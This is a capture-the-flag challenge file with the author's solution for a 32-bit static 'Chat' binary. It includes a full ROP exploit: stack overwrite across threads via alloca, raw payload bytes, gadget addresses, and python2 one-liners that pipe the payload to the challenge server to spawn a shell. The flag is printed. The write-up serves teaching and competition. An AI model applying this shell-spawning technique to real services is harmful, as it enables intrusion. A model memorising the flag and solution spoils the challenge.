Chat
====

# Author
n0p

# Challenge Text
To coordinate our efforts for a better future we started to build a chat program. While it doesn't have much functionality, yet, maybe you could have a look at it already to see if you can find any serious vulnerabilities. You know, better save than sorry!<br>
<br>
<code>nc chat.forfuture.fluxfingers.net 1337</code>

# Challenge Idea
[ROP/Etc. in the stack of another thread.](https://blog.exodusintel.com/2013/01/07/who-was-phone/)

# Setup

Compiling the Sources:
```
clang -no-pie -static chat.c -lpthread -ochat -Wl,-z,now -Wl,-z,relro
strip -g chat
```

Docker from:
```
FROM i386/alpine
```

Docker entrypoint:
```
ENTRYPOINT ["/usr/bin/socat", "-t5", "-T60", "tcp-listen:1337,max-children=50,reuseaddr,fork", "exec:./chat,pty,raw,stderr,echo=0"]
```

# Solution
Idea:

* There is enough space in the command variable to place the string '/bin/sh', argv, and envp in the bss section.
* Create two channels and allocate enough memory with `alloca` via the echo command in the first channel to write to the stack of the second channel.
* ROP to execve.

```
# create channel 1
/nc\n
# pause channel 1 and return to command channel
/pc\n

# create channel 2
/nc\n
# pause channel 2 and return to command channel
/pc\n

# join channel 1 again
/jc 1\n

# echo a message
/e\n
# length of the message is 250000 -> we write to the stack of channel 2
# + 2 NULL bytes (two because I like 0xC more than 0xB) + '/bin/sh' + NULL byte + addr of '/bin/sh' string in command + NULL dword
250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n
# send rop code
\x00\x00\x00\x00\x40\x74\x0f\x08\x34\x74\x0f\x08\x1e\x90\x04\x08\x2c\x74\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n

# terminate channel 1
/qc\n

# join channel 2
/jc 2\n
```

The function who's return address gets overwritten is `__kernel_vsyscall`:
```
 → 0xf7ffdb20 <__kernel_vsyscall+0> push   ecx
   0xf7ffdb21 <__kernel_vsyscall+1> push   edx
   0xf7ffdb22 <__kernel_vsyscall+2> push   ebp
   0xf7ffdb23 <__kernel_vsyscall+3> mov    ebp, esp
   0xf7ffdb25 <__kernel_vsyscall+5> sysenter 
   0xf7ffdb27 <__kernel_vsyscall+7> int    0x80
```
This function is called at address 0x08079004 in poll:
```
.text:08078FE8 loc_8078FE8:                            ; CODE XREF: poll+19↑j
.text:08078FE8                 mov     [esp+1Ch+var_10], edx
.text:08078FEC                 mov     [esp+1Ch+var_14], ecx
.text:08078FF0                 call    __libc_enable_asynccancel
.text:08078FF5                 mov     ecx, [esp+1Ch+var_14]
.text:08078FF9                 mov     edx, [esp+1Ch+var_10]
.text:08078FFD                 mov     esi, eax
.text:08078FFF                 mov     eax, 0A8h
.text:08079004                 call    large dword ptr gs:10h
.text:0807900B                 cmp     eax, 0FFFFF000h
.text:08079010                 ja      short loc_807903A
```

As one can see, the registers ecx and edx are pushed at the beginning of `__kernel_vsyscall`. Therefore, we can set ecx and edx conveniently due to `__kernel_vsyscall`'s pops of these registers before its return. 

ROP dissected:
```
# ebp
\x00\x00\x00\x00

# edx -> envp points to NULL dword in command buffer -> envp = [NULL]
\x98\x73\x0f\x08

# ecx -> argv points in command buffer -> argv = ["/bin/sh", NULL]
\x94\x73\x0f\x08

# ret -> 0x0804901e : pop ebx ; ret
\x1e\x90\x04\x08
# ebx -> addr of nick with '/bin/sh'
\x8c\x73\x0f\x08

# ret -> 0x08051cf6 : pop eax ; ret
\xf6\x1c\x05\x08
# eax -> shell code number
\x0b\x00\x00\x00

# ret -> 0x0807D3D0 : int 0x80 ; retn (_dl_sysinfo_int80)
\xd0\xd3\x07\x08
```

This results in these commands:
```
(python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | ./chat
```
```
(python2 -c "print '/nc\n/pc\n/nc\n/pc\n/jc 1\n/e\n250000\0\0/bin/sh\x00\x8c\x73\x0f\x08\x00\x00\x00\x00\n\x00\x00\x00\x00\x98\x73\x0f\x08\x94\x73\x0f\x08\x1e\x90\x04\x08\x8c\x73\x0f\x08\xf6\x1c\x05\x08\x0b\x00\x00\x00\xd0\xd3\x07\x08\n/qc\n/jc 2\n'"; cat - ) | nc chat.forfuture.fluxfingers.net 1337
```

Apparently, the remote solution required `execve('/bin/sh', ["/bin/sh", NULL], [NULL])` and didn't accept `execve('/bin/sh', [NULL], [NULL])`. However, this text book solution had the first execve to begin with and the requirement hasn't been noticed in time.

# Difficulty
Easy

# Flag
flag{thread_chat_with_alloca}